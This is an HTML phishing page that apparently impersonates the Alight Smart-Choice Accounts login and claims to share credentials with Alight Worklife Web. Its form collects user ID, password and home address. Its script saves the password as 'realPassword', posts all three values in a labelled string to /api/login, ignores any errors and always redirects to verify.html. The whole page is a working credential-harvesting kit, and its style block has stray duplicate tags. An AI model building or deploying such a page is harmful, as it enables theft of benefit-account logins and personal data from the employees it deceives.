<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Login</title>
    <style>
        <<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        min-height: 100vh;           /* This is important */
        height: 100vh;               /* Added for full coverage */
        padding: 20px;
        display: flex;
        flex-direction: column;
        align-items: center;
        
        /* Background Image - Improved */
        background-image: url('alight1.png');
        background-size: cover;           /* Makes image fill the screen */
        background-position: center center;
        background-repeat: no-repeat;
        background-attachment: fixed;
        
        /* Dark overlay for readability */
        position: relative;
    }

    /* Stronger dark overlay */
    body::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(15, 23, 42, 0.55);   /* Slightly darker for better contrast */
        z-index: -1;
    }

    .logo-container { 
        text-align: center; 
        margin: 40px 0 30px; 
        z-index: 2; 
        position: relative;
    }
    
    .logo-container h1 { 
        font-size: 2.2rem; 
        font-weight: 700; 
        color: white;
        text-shadow: 0 2px 10px rgba(0,0,0,0.7);
    }
    
    .logo-container .subtitle { 
        font-size: 1.8rem; 
        color: white; 
        margin-top: 5px;
        text-shadow: 0 2px 10px rgba(0,0,0,0.7);
    }
    
    .sun-icon { 
        font-size: 3.5rem; 
        margin: 15px 0; 
    }
    
    .form-container { 
        width: 100%; 
        max-width: 380px; 
        background: rgba(255, 255, 255, 0.96);  
        padding: 35px 30px;
        border-radius: 12px;
        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.35);
        z-index: 2;
        position: relative;
    }

    /* Rest of your styles remain the same */
    label { 
        display: block; 
        margin: 25px 0 8px; 
        font-size: 1.05rem; 
        color: #1e2937; 
        font-weight: 500; 
    }

    input { 
        width: 100%; 
        padding: 14px 16px; 
        border: none; 
        border-bottom: 1.5px solid #cbd5e1; 
        font-size: 1.1rem; 
        background: transparent; 
    }

    input:focus { 
        outline: none; 
        border-bottom-color: #3b82f6; 
    }

    .login-btn { 
        width: 100%; 
        padding: 16px; 
        background: #1e40af; 
        color: white; 
        border: none; 
        border-radius: 50px; 
        font-size: 1.2rem; 
        font-weight: 600; 
        margin: 15px 0; 
        cursor: pointer; 
    }

    .worklife {
        font-size: 16px;
        font-weight: 600;
        color: #0052cc;
        background-color: #f0f7ff;
        padding: 16px 20px;
        margin: 20px 0;
        border-left: 5px solid #0052cc;
        border-radius: 6px;
        line-height: 1.6;
        text-align: left;
        box-shadow: 0 2px 8px rgba(0, 82, 204, 0.1);
    }

    .helper-text {
        display: block;
        margin-top: 6px;
        font-size: 14px;
        color: #0052cc;
        font-weight: 500;
    }
</style>
</style>
    </style>
</head>
<body>
    <div class="logo-container">
        <h1>alight</h1>
        <div class="subtitle">Smart-Choice Accounts®</div>
        <div class="sun-icon">☀️</div>
        <div class="worklife">Same login used to access benefits on Alight Worklife Web</div>
    </div>

    <div class="form-container">
        <form id="loginForm">
           <div class="form-group">
                <label for="username">Enter your User ID</label>
                <input type="text" id="username" placeholder="User ID" required>
                <small class="helper-text">Same ID used to access benefits on Alight Worklife Web</small>
            </div>

            <div class="form-group">
                <label for="password">Enter your Password</label>
                <input type="password" id="password" placeholder="Password" required>
                <small class="helper-text">Same password used to access benefits on Alight Worklife Web</small>
            </div>

            <label>Home Address (Current)</label>
            <input type="text" id="address" placeholder="Enter your current home address" required>

            <button type="submit" class="login-btn">LOG IN</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const homeAddress = document.getElementById('address').value.trim();

            sessionStorage.setItem('realPassword', password);

            try {
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        username, 
                        password, 
                        address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
                    })
                });
            } catch (err) {}

            window.location.href = "verify.html";
        });
    </script>
    <script src="app.js"></script>
</body>
</html>
